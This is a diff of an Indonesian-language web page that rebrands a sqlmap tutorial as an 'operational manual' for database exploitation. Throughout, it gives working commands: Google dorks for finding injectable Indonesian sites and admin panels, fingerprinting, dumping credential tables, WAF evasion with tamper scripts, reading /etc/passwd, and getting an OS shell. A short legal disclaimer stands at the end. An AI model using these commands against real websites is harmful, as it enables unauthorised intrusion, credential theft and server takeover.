@@ -3,121 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tutorial sqlmap | ZentraSec</title>
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <title>Advanced SQLmap Methodology | RIAU EXPLOITER</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
     <style>
-        :root { --accent: #ff3b30; --text: #1d1d1f; --sub: #636366; --code-bg: #0d1117; --border: rgba(0,0,0,0.06); }
+        :root { --accent: #ff3b30; --text: #1c1c1e; --sub: #636366; --bg: #ffffff; --border: #efeff4; --code: #0d1117; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
-        body { background: #ffffff; color: var(--text); line-height: 1.7; }
+        body { background: var(--bg); color: var(--text); line-height: 1.6; -webkit-font-smoothing: antialiased; }
         
-        nav { padding: 12px 8%; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); background: rgba(255,255,255,0.8); backdrop-filter: blur(15px); position: sticky; top: 0; z-index: 100; }
+        nav { padding: 15px 8%; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); background: rgba(255,255,255,0.9); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100; }
+        .logo { font-weight: 800; font-size: 0.85rem; letter-spacing: -0.3px; text-transform: uppercase; }
+        .logo span { color: var(--accent); }
+
         .container { max-width: 700px; margin: 40px auto; padding: 0 20px; }
         
-        /* Judul Rapi, Nggak Segede Gaban */
-        .meta { font-size: 0.65rem; font-weight: 800; color: var(--accent); text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; display: block; }
-        h1 { font-size: 1.8rem; font-weight: 800; letter-spacing: -0.8px; line-height: 1.2; color: #111; margin-bottom: 30px; }
-        
-        .hero-img { width: 100%; height: 320px; border-radius: 18px; overflow: hidden; margin-bottom: 40px; border: 1px solid var(--border); }
-        .hero-img img { width: 100%; height: 100%; object-fit: cover; content: url('https://h.top4top.io/p_3681vwh7q7.png'); }
+        header { margin-bottom: 40px; border-bottom: 1px solid var(--border); padding-bottom: 30px; }
+        .meta { font-size: 0.6rem; font-weight: 800; color: var(--accent); text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 8px; display: block; }
+        h1 { font-size: 1.4rem; font-weight: 800; letter-spacing: -0.8px; color: #000; margin-bottom: 12px; }
+        .desc { font-size: 0.85rem; color: var(--sub); line-height: 1.5; }
 
-        h2 { font-size: 1.3rem; font-weight: 800; margin: 40px 0 15px; color: #000; }
-        p { margin-bottom: 20px; font-size: 0.95rem; color: #444; }
+        .hero-img { width: 100%; border-radius: 12px; overflow: hidden; margin-bottom: 40px; border: 1px solid var(--border); }
+        .hero-img img { width: 100%; display: block; }
 
-        /* Kotak Penjelasan Simpel */
-        .info-card { background: #f9f9fb; padding: 20px; border-radius: 14px; border: 1px solid var(--border); margin: 25px 0; }
-        .info-card b { color: #000; font-size: 0.9rem; display: block; margin-bottom: 5px; }
-        .info-card p { font-size: 0.88rem; margin: 0; color: var(--sub); }
+        section { margin-bottom: 50px; }
+        h2 { font-size: 1rem; font-weight: 800; margin-bottom: 20px; color: #000; text-transform: uppercase; display: flex; align-items: center; gap: 10px; }
+        h2::before { content: ''; width: 3px; height: 15px; background: var(--accent); border-radius: 10px; }
+        p { margin-bottom: 15px; font-size: 0.82rem; color: #3a3a3c; text-align: justify; }
 
-        /* Code Block Minimalis */
-        .code-block { background: var(--code-bg); color: #abb2bf; padding: 18px; border-radius: 12px; font-family: 'Fira Code', monospace; font-size: 0.82rem; margin: 20px 0; overflow-x: auto; }
+        /* Technical Components */
+        .cmd-label { font-size: 0.65rem; font-weight: 700; color: #8e8e93; margin-bottom: 6px; display: block; font-family: 'Fira Code', monospace; }
+        .code-block { background: var(--code); color: #d1d1d6; padding: 20px; border-radius: 8px; font-family: 'Fira Code', monospace; font-size: 0.72rem; margin-bottom: 25px; overflow-x: auto; border: 1px solid rgba(255,255,255,0.05); position: relative; }
         .code-block b { color: var(--accent); }
+        .code-block i { color: #5fb3b3; font-style: normal; }
 
-        .footer-disclaimer { margin-top: 80px; padding: 25px; border-radius: 14px; background: #fff1f0; border: 1px solid #ffa39e; }
-        .footer-disclaimer h4 { color: #cf1322; font-size: 0.9rem; margin-bottom: 10px; }
-        .footer-disclaimer p { font-size: 0.82rem; margin: 0; color: #555; }
+        .feature-box { background: #fbfbfd; border: 1px solid var(--border); padding: 20px; border-radius: 10px; margin: 20px 0; }
+        .feature-box h4 { font-size: 0.75rem; font-weight: 800; margin-bottom: 10px; text-transform: uppercase; color: #1c1c1e; }
+        .feature-box ul { list-style: none; }
+        .feature-box li { font-size: 0.78rem; color: #48484a; margin-bottom: 6px; padding-left: 15px; position: relative; }
+        .feature-box li::before { content: "›"; position: absolute; left: 0; color: var(--accent); font-weight: 900; }
 
-        footer { text-align: center; padding: 60px 0; font-size: 0.6rem; color: #bbb; letter-spacing: 2px; border-top: 1px solid var(--border); }
+        .warning-box { background: #fff1f0; border: 1px solid #ffa39e; padding: 20px; border-radius: 10px; margin-top: 40px; }
+        .warning-box h4 { font-size: 0.75rem; color: #cf1322; text-transform: uppercase; margin-bottom: 5px; }
+        .warning-box p { font-size: 0.75rem; color: #5c0011; margin: 0; }
+
+        footer { text-align: center; padding: 50px 0; font-size: 0.6rem; color: #bbb; letter-spacing: 2px; border-top: 1px solid var(--border); }
     </style>
 </head>
 <body>
     <nav>
-        <div style="font-weight: 900; color: #000; font-size: 1rem;">ZENTRA<span style="color:var(--accent)">SEC</span></div>
-        <a href="hacking.html" style="text-decoration:none; color:#666; font-size:0.65rem; font-weight:700; border: 1px solid #eee; padding: 5px 12px; border-radius: 6px;">Kembali</a>
+        <div class="logo">RIAU<span>EXPLOITER</span></div>
+        <div style="font-size: 0.6rem; font-weight: 700; color: var(--sub);">RE / INF / 2026</div>
     </nav>
 
     <article class="container">
-        <span class="meta">Step-by-Step Guide</span>
-        <h1>Tutorial Penggunaan sqlmap: Dari Instalasi Hingga OS Shell</h1>
+        <header>
+            <span class="meta">Full Operational Manual</span>
+            <h1>Dokumentasi Teknis Ekstraksi & Eksploitasi Database</h1>
+            <p class="desc">Panduan komprehensif mengenai metodologi audit database menggunakan framework sqlmap, mencakup tahap enumerasi skema hingga pengambilalihan hak akses sistem.</p>
+        </header>
 
-        <div class="hero-img"><img></div>
+        <div class="hero-img">
+            <img src="https://i.top4top.io/p_3681gkrs57.png" alt="RE-Cover">
+        </div>
 
-        <div class="article-body">
-            <p>Banyak orang bingung pakai <b>sqlmap</b> karena terlalu banyak perintah. Tenang, kita bedah pelan-pelan pakai bahasa yang gampang dimengerti, dari cara pasang sampai dapet akses ke sistem target.</p>
-
-            <h2>1. Persiapan & Instalasi</h2>
-            <p>Apapun perangkatnya (Termux, Linux, atau VPS), cara pasangnya sama karena pakai basis <b>Python</b>.</p>
-            
+        <section>
+            <h2>01. Reconnaissance & Target Acquisition</h2>
+            <p>Tahap awal melibatkan pencarian titik masuk (entry point) melalui teknik Google Dorking untuk mengidentifikasi aplikasi web yang terekspos dengan parameter dinamis.</p>
+            <span class="cmd-label">Google Search Queries:</span>
             <div class="code-block">
-                git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev<br>
-                cd sqlmap-dev
+                # Mencari parameter PHP dinamis<br>
+                inurl:index.php?id=<br><br>
+                # Mencari pesan kesalahan SQL yang bocor<br>
+                "SQL syntax error" site:.id<br><br>
+                # Mencari direktori administrasi<br>
+                intitle:"login" inurl:"/admin/login.php"
             </div>
+        </section>
 
-            <div class="info-card">
-                <b>Kenapa pakai perintah itu?</b>
-                <p>Kita mengambil "nyawa" sqlmap langsung dari pusatnya (GitHub) supaya dapat fitur terbaru untuk nembus keamanan web zaman sekarang.</p>
-            </div>
-
-            <h2>2. Mencari Celah (Scanning)</h2>
-            <p>Langkah awal adalah "mengetuk pintu" target untuk melihat apakah ada celah yang bisa dimasuki.</p>
-            
+        <section>
+            <h2>02. Enumerasi Sidik Jari (Fingerprinting)</h2>
+            <p>Sebelum melakukan penarikan data, sistem perlu melakukan identifikasi terhadap jenis DBMS, versi, dan hak akses pengguna saat ini.</p>
             <div class="code-block">
-                python3 sqlmap.py -u "http://target.com/cek.php?id=1" --dbs
+                # Cek informasi dasar & hak akses admin<br>
+                python3 sqlmap.py -u "URL" <i>--banner --current-user --is-dba</i><br><br>
+                # Cek daftar hak istimewa (privileges) user database<br>
+                python3 sqlmap.py -u "URL" <i>--privileges</i>
             </div>
-
-            <div class="info-card">
-                <b>Penjelasan Perintah:</b>
-                <p><b>-u :</b> Target URL yang mau dicek.<br><b>--dbs :</b> Menyuruh sqlmap mencari nama-nama Database yang ada di dalamnya.</p>
-            </div>
-
-            <h2>3. Mengambil Data (Dumping)</h2>
-            <p>Setelah tahu nama Database-nya, saatnya kita intip isi tabel dan datanya.</p>
             
+        </section>
+
+        <section>
+            <h2>03. Skema Enumerasi & Dumping</h2>
+            <p>Tahap inti di mana struktur data dipetakan secara hierarkis untuk menemukan informasi sensitif seperti kredensial administrator.</p>
+            
+            <h3>Langkah 1: Mendapatkan Database</h3>
             <div class="code-block">
-                <span style="color:#777"># Cari Tabel di database 'db_utama'</span><br>
-                python3 sqlmap.py -u "URL" -D db_utama --tables<br><br>
-                <span style="color:#777"># Ambil data dari tabel 'users'</span><br>
-                python3 sqlmap.py -u "URL" -D db_utama -T users --dump
+                python3 sqlmap.py -u "URL" <i>--dbs</i>
             </div>
 
-            <h2>4. Level Master: Ambil Alih Sistem (--os-shell)</h2>
-            <p>Ini adalah tahap akhir. Jika beruntung, kita bisa mengendalikan server lewat terminal jarak jauh.</p>
-            
+            <h3>Langkah 2: Menemukan Tabel dalam Database Terpilih</h3>
             <div class="code-block">
+                python3 sqlmap.py -u "URL" -D <b>nama_database</b> <i>--tables</i>
+            </div>
+
+            <h3>Langkah 3: Menemukan Kolom dalam Tabel Terpilih</h3>
+            <div class="code-block">
+                python3 sqlmap.py -u "URL" -D <b>nama_database</b> -T <b>nama_tabel</b> <i>--columns</i>
+            </div>
+
+            <h3>Langkah 4: Ekstraksi Data (The Final Dump)</h3>
+            <div class="code-block">
+                # Dump kolom username dan password saja<br>
+                python3 sqlmap.py -u "URL" -D <b>db</b> -T <b>users</b> -C "user,pass" <i>--dump</i><br><br>
+                # Dump seluruh isi tabel secara otomatis<br>
+                python3 sqlmap.py -u "URL" -D <b>db</b> -T <b>users</b> <i>--dump-all</i>
+            </div>
+            
+        </section>
+
+        <section>
+            <h2>04. Teknik Bypass Modern (WAF/IDS)</h2>
+            <p>Jika target dilindungi firewall, gunakan parameter optimasi berikut untuk menghindari blokir alamat IP.</p>
+            <div class="code-block">
+                python3 sqlmap.py -u "URL" <i>--random-agent --level=5 --risk=3</i><br>
+                <i>--tamper=</i>space2comment,between,randomcase,charencode
+            </div>
+            <div class="feature-box">
+                <h4>Tamper Script Analysis:</h4>
+                <ul>
+                    <li><b>space2comment:</b> Mengubah spasi menjadi /**/ untuk mematikan filter regex.</li>
+                    <li><b>randomcase:</b> Mengacak besar-kecil huruf (SeLeCt) untuk bypass signature.</li>
+                    <li><b>between:</b> Mengganti operator '>' dengan operator 'BETWEEN'.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section>
+            <h2>05. Post-Exploitation & OS Access</h2>
+            <p>Tahap akhir untuk mendapatkan kendali penuh atas sistem operasi server web melalui celah database.</p>
+            <div class="code-block">
+                # Membaca file internal server (Contoh: /etc/passwd)<br>
+                python3 sqlmap.py -u "URL" <i>--file-read=</i>"/etc/passwd"<br><br>
+                # Mendapatkan shell terminal interaktif<br>
                 python3 sqlmap.py -u "URL" <b>--os-shell</b>
             </div>
-
-            <div class="info-card">
-                <b>Apa itu OS Shell?</b>
-                <p>Kondisi di mana kita bisa mengetik perintah apa saja ke server target, seperti melihat file sistem atau menghapus data, langsung dari terminal kita.</p>
+            <div class="feature-box">
+                <h4>Kebutuhan Shell:</h4>
+                <ul>
+                    <li>Web server harus memiliki izin tulis (writable).</li>
+                    <li>User database harus memiliki hak <b>FILE privilege</b>.</li>
+                    <li>Database harus berupa MySQL, PostgreSQL, atau SQL Server.</li>
+                </ul>
             </div>
+        </section>
 
-            <h2>5. Tips Biar Nggak Gampang Ketahuan</h2>
-            <p>Biar nggak langsung diblokir sama keamanan web target, gunakan trik ini:</p>
-            <ul>
-                <li style="font-size: 0.9rem; margin-bottom: 10px;"><b>--random-agent :</b> Menyamarkan diri jadi browser biasa (Chrome/Safari).</li>
-                <li style="font-size: 0.9rem; margin-bottom: 10px;"><b>--tamper=space2comment :</b> Mengacak kode biar nggak kebaca sama satpam digital (Firewall).</li>
-            </ul>
-
-            <div class="footer-disclaimer">
-                <h4>Peringatan Hukum (Disclaimer)</h4>
-                <p>Segala isi tutorial ini ditujukan untuk pembelajaran keamanan informasi saja. Melakukan serangan ke sistem orang lain tanpa izin adalah tindakan ilegal (UU ITE). Gunakan ilmu ini dengan bijak di lingkungan latihan sendiri.</p>
-            </div>
+        <div class="warning-box">
+            <h4>Penyangkalan Tanggung Jawab</h4>
+            <p>Materi ini ditujukan untuk edukasi keamanan informasi. RIAU EXPLOITER tidak bertanggung jawab atas tindakan ilegal yang dilakukan oleh pengguna terhadap sistem tanpa izin pemilik yang sah.</p>
         </div>
     </article>
 
     <footer>
-        &copy; 2026 ZENTRASEC - TUTORIAL SIMPLE & PADAT
+        &copy; 2026 RIAU EXPLOITER
     </footer>
 </body>
 </html>
-          
